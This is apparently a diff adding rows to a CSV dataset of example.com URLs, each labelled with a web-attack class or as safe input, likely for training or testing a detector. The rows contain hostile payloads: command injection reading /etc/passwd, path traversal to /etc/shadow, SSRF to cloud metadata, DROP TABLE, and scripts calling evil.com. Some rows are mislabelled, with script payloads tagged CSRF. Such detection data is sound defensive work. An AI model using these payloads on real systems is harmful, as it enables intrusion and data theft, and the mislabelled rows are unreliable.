+https://example.com/?user=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?cmd=page%3Dhome,NONE,Safe input
+https://example.com/?file=about-us,NONE,Safe input
+https://example.com/?redirect=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?redirect=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?cmd=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?path=filter%3Dpopular,NONE,Safe input
+https://example.com/?content=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?url=filter%3Dpopular,NONE,Safe input
+https://example.com/?input=logout%3Dtrue,NONE,Safe input
+https://example.com/?input=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?input=lang%3Den,NONE,Safe input
+https://example.com/?id=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?token=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?url=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?user=category%3Dbooks,NONE,Safe input
+https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?id=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?file=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?url=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?file=lang%3Den,NONE,Safe input
+https://example.com/?data=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?cmd=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?cmd=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?search=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?file=search%3Dproducts,NONE,Safe input
+https://example.com/?search=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?token=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?file=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?file=filter%3Dpopular,NONE,Safe input
+https://example.com/?path=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?token=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?url=id%3D567,NONE,Safe input
+https://example.com/?content=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?token=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?search=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?token=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?search=feedback,NONE,Safe input
+https://example.com/?search=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?search=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?file=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?file=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?search=lang%3Den,NONE,Safe input
+https://example.com/?input=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?input=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?token=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?input=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?data=apple,NONE,Safe input
+https://example.com/?token=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?cmd=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?redirect=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?cmd=search%3Dproducts,NONE,Safe input
+https://example.com/?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?search=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?token=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?q=user123,NONE,Safe input
+https://example.com/?path=banana,NONE,Safe input
+https://example.com/?data=apple,NONE,Safe input
+https://example.com/?token=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?path=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?data=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?input=apple,NONE,Safe input
+https://example.com/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?search=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?content=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?file=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?input=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?id=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?file=logout%3Dtrue,NONE,Safe input
+https://example.com/?content=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?q=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?user=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?url=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?content=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?q=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?data=name%3DJohnDoe,NONE,Safe input
+https://example.com/?redirect=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?cmd=feedback,NONE,Safe input
+https://example.com/?redirect=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?content=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?q=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?file=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?id=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?file=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?data=banana,NONE,Safe input
+https://example.com/?input=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?path=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?cmd=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?cmd=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?q=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?id=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?input=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?q=logout%3Dtrue,NONE,Safe input
+https://example.com/?user=name%3DJohnDoe,NONE,Safe input
+https://example.com/?data=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?cmd=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?search=query%3Dhelp,NONE,Safe input
+https://example.com/?data=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?token=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?input=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?content=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?id=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?input=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?cmd=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?url=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?path=logout%3Dtrue,NONE,Safe input
+https://example.com/?token=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?id=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?url=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?input=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
+https://example.com/?search=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?redirect=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?token=search%3Dproducts,NONE,Safe input
+https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?id=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?content=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?content=query%3Dhelp,NONE,Safe input
+https://example.com/?search=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?redirect=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?path=apple,NONE,Safe input
+https://example.com/?input=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?cmd=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?file=page%3Dhome,NONE,Safe input
+https://example.com/?user=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?url=user123,NONE,Safe input
+https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?cmd=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?token=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?redirect=filter%3Dpopular,NONE,Safe input
+https://example.com/?file=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?url=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?url=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?token=name%3DJohnDoe,NONE,Safe input
+https://example.com/?input=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?content=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?q=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?user=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?search=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?redirect=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?path=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?content=apple,NONE,Safe input
+https://example.com/?input=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?url=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?redirect=id%3D567,NONE,Safe input
+https://example.com/?id=%26%26whoami,Command Injection,Command Injection payload: &&whoami
+https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?q=feedback,NONE,Safe input
+https://example.com/?token=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?id=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?content=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?id=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?redirect=user123,NONE,Safe input
+https://example.com/?id=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?input=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?file=apple,NONE,Safe input
+https://example.com/?url=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?data=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?search=feedback,NONE,Safe input
+https://example.com/?q=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?url=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?token=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?cmd=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?content=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
+https://example.com/?cmd=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?user=feedback,NONE,Safe input
+https://example.com/?url=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?cmd=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?id=category%3Dbooks,NONE,Safe input
+https://example.com/?url=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?redirect=feedback,NONE,Safe input
+https://example.com/?data=hello,NONE,Safe input
+https://example.com/?token=user123,NONE,Safe input
+https://example.com/?data=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?file=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?data=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?cmd=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?cmd=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?data=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?content=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?data=user123,NONE,Safe input
+https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?token=apple,NONE,Safe input
+https://example.com/?q=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?content=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?path=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?path=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?path=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?cmd=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?q=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?cmd=hello,NONE,Safe input
+https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?path=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?search=feedback,NONE,Safe input
+https://example.com/?redirect=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?token=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?search=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?file=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?user=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?url=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
+https://example.com/?cmd=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?token=feedback,NONE,Safe input
+https://example.com/?content=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?path=category%3Dbooks,NONE,Safe input
+https://example.com/?content=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?data=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?content=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?token=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?path=page%3Dhome,NONE,Safe input
+https://example.com/?q=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?token=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?path=logout%3Dtrue,NONE,Safe input
+https://example.com/?cmd=name%3DJohnDoe,NONE,Safe input
+https://example.com/?search=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?user=filter%3Dpopular,NONE,Safe input
+https://example.com/?redirect=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?data=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
+https://example.com/?redirect=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
+https://example.com/?url=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
+https://example.com/?path=filter%3Dpopular,NONE,Safe input
+https://example.com/?redirect=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
+https://example.com/?q=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?search=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?data=query%3Dhelp,NONE,Safe input
+https://example.com/?user=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?q=page%3Dhome,NONE,Safe input
+https://example.com/?url=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?cmd=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
+https://example.com/?file=apple,NONE,Safe input
+https://example.com/?content=category%3Dbooks,NONE,Safe input
+https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?path=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?search=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?token=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
+https://example.com/?redirect=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
+https://example.com/?cmd=%3Bls,Command Injection,Command Injection payload: ;ls
+https://example.com/?redirect=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
+https://example.com/?redirect=id%3D567,NONE,Safe input
+https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?cmd=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
+https://example.com/?content=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?token=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
+https://example.com/?file=logout%3Dtrue,NONE,Safe input
+https://example.com/?id=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
+https://example.com/?content=banana,NONE,Safe input
+https://example.com/?redirect=category%3Dbooks,NONE,Safe input
+https://example.com/?path=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?redirect=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
+https://example.com/?data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
+https://example.com/?url=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
